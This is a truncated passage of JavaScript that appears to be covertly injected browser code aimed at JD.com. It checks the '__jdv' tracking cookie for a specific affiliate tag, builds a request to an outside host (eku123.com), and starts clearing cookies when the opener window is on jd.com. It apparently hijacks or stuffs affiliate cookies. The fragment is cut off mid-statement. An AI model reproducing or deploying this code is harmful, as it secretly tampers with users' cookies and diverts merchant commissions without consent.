...
//            })(js_src.split('?'));
    ...
    if (!thisWindow.l___k__s && !isOpera && navigator.cookieEnabled) {
        ...
        var key = "__jdv";
        run_only_once("onlyoncecqjd", function(){
            if (!/t_34961_/.test(getCookie(key))) {
                var url = "http://www.eku123.com/ejour.html?f=2&k=" + (new Date()).valueOf();
                //0515加对当前域名的判断
                if (thisWindow.opener && thisWindow.top.location.hostname.indexOf("jd.com") > 0) {
                    try {
                        clearCookie();
